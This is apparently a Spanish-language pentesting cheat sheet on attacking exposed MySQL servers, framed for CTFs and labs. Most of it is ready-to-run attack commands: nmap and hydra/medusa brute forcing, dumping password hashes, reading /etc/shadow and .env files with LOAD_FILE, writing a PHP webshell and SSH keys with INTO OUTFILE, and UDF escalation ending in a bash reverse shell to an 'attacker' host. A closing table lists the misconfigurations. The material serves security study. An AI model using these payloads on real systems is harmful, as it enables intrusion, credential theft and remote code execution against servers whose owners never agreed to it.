# MySQL

MySQL es el sistema de gestión de bases de datos relacional de código abierto más popular del mundo. Opera en el puerto **3306** (TCP). Aunque no debería estar expuesto a internet, en entornos mal configurados o en CTFs/labs es accesible y ofrece mucha información y vías de escalada.

### Enumeración

#### Nmap

```bash
# Detección básica
nmap -sV -p 3306 target

# Scripts específicos para MySQL
nmap -sC -sV -p 3306 target
nmap --script mysql-info,mysql-enum,mysql-databases,mysql-empty-password -p 3306 target
nmap --script mysql-brute -p 3306 target
nmap --script mysql-vuln* -p 3306 target
```

#### Conexión y autenticación

```bash
# Conectar con usuario y contraseña
mysql -h target -u root -p
mysql -h target -u root -pcontraseña    # sin espacio entre -p y la contraseña
mysql -h target -u root -pcontraseña -e "SELECT version();"    # ejecutar comando directo

# Probar sin contraseña (misconfiguration)
mysql -h target -u root
mysql -h target -u root -p""

# Con usuario anónimo
mysql -h target -u "" -p""
```

#### Brute force

```bash
# Hydra
hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://target
hydra -L users.txt -P passwords.txt mysql://target

# Medusa
medusa -h target -u root -P /usr/share/wordlists/rockyou.txt -M mysql

# nmap script
nmap --script mysql-brute --script-args userdb=users.txt,passdb=passwords.txt -p 3306 target
```

### Enumeración dentro de MySQL

Una vez conectado, estos son los comandos más útiles para extraer información:

```sql
-- Información del servidor
SELECT version();
SELECT @@version;
SELECT @@hostname;
SELECT @@datadir;           -- directorio donde se almacenan los datos
SELECT @@secure_file_priv;  -- directorio permitido para LOAD/SELECT INTO OUTFILE

-- Usuarios y privilegios
SELECT user, host, password FROM mysql.user;
SELECT user, host, authentication_string FROM mysql.user;
SHOW GRANTS FOR 'root'@'localhost';
SELECT * FROM mysql.user WHERE Super_priv = 'Y';   -- usuarios con privilegios de super

-- Bases de datos
SHOW DATABASES;
USE nombre_db;
SHOW TABLES;
DESCRIBE tabla;
SELECT * FROM tabla LIMIT 10;

-- Ver variables del sistema
SHOW VARIABLES;
SHOW VARIABLES LIKE '%secure%';
SHOW VARIABLES LIKE '%plugin%';

-- Ver conexiones activas
SHOW PROCESSLIST;

-- Schemas con información de la instalación
SELECT schema_name FROM information_schema.schemata;
SELECT table_name FROM information_schema.tables WHERE table_schema = 'nombre_db';
SELECT column_name FROM information_schema.columns WHERE table_name = 'nombre_tabla';
```

### Lectura y escritura de archivos

Si el usuario MySQL tiene los privilegios `FILE`, puede leer y escribir archivos del sistema operativo. Esto es un vector de escalada muy potente.

```sql
-- Leer archivos del sistema
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/etc/shadow');
SELECT LOAD_FILE('/var/www/html/.env');
SELECT LOAD_FILE('/etc/mysql/my.cnf');

-- Escribir archivos (si @@secure_file_priv está vacío o apunta a un directorio escribible)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
SELECT "SSH_RSA AAAA..." INTO OUTFILE '/root/.ssh/authorized_keys';
```

> La escritura de archivos solo funciona si `secure_file_priv` está vacío o apunta al directorio destino, y si el proceso de MySQL tiene permisos de escritura en ese directorio.

### Escalada de privilegios via User Defined Functions (UDF)

En versiones antiguas de MySQL, es posible cargar una librería compartida como UDF (User Defined Function) para ejecutar comandos del sistema operativo.

```sql
-- Verificar si es posible
SHOW VARIABLES LIKE 'plugin_dir';    -- directorio de plugins

-- Si el usuario tiene FILE y puede escribir en plugin_dir:
-- 1. Subir la librería UDF (raptor_udf2.so o lib_mysqludf_sys.so)
SELECT binary 0x... INTO DUMPFILE '/usr/lib/mysql/plugin/udf.so';

-- 2. Crear la función
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'udf.so';

-- 3. Ejecutar comandos como el usuario que corre MySQL (normalmente root)
SELECT sys_exec('id');
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"');
```

### Riesgos y misconfiguraciones

| Riesgo                           | Descripción                                                                                         |
| -------------------------------- | --------------------------------------------------------------------------------------------------- |
| **Sin contraseña en root**       | El usuario root de MySQL sin contraseña es una misconfiguration crítica.                            |
| **MySQL accesible externamente** | Puerto 3306 expuesto a internet o a segmentos de red no autorizados.                                |
| **Privilegio FILE**              | Permite leer archivos del sistema y potencialmente escribir webshells.                              |
| **Credenciales por defecto**     | `root` sin contraseña o con `root`, `mysql`, `password`...                                          |
| **Datos sensibles sin cifrar**   | Contraseñas de usuarios en texto claro o con hashes débiles (MD5) en la base de datos.              |
| **Inyección SQL**                | Las aplicaciones que usan MySQL sin prepared statements son vulnerables a SQLi.                     |
| **UDF para RCE**                 | En versiones antiguas y con privilegios suficientes, es posible ejecutar comandos del SO.           |
| **MySQL corriendo como root**    | Si el proceso MySQL corre como root del sistema, cualquier escritura de archivos se hace como root. |

> Lo primero al conectarse a MySQL es verificar `SELECT @@secure_file_priv;`. Si devuelve vacío, el privilegio FILE permite leer cualquier archivo que el proceso MySQL pueda leer — incluyendo `/etc/shadow` si MySQL corre como root.

> Un usuario MySQL con privilegio `SUPER` o `FILE` en un servidor web es a menudo el camino a **RCE**: escribir una webshell en el directorio web con `SELECT ... INTO OUTFILE` convierte la inyección SQL en ejecución de código.
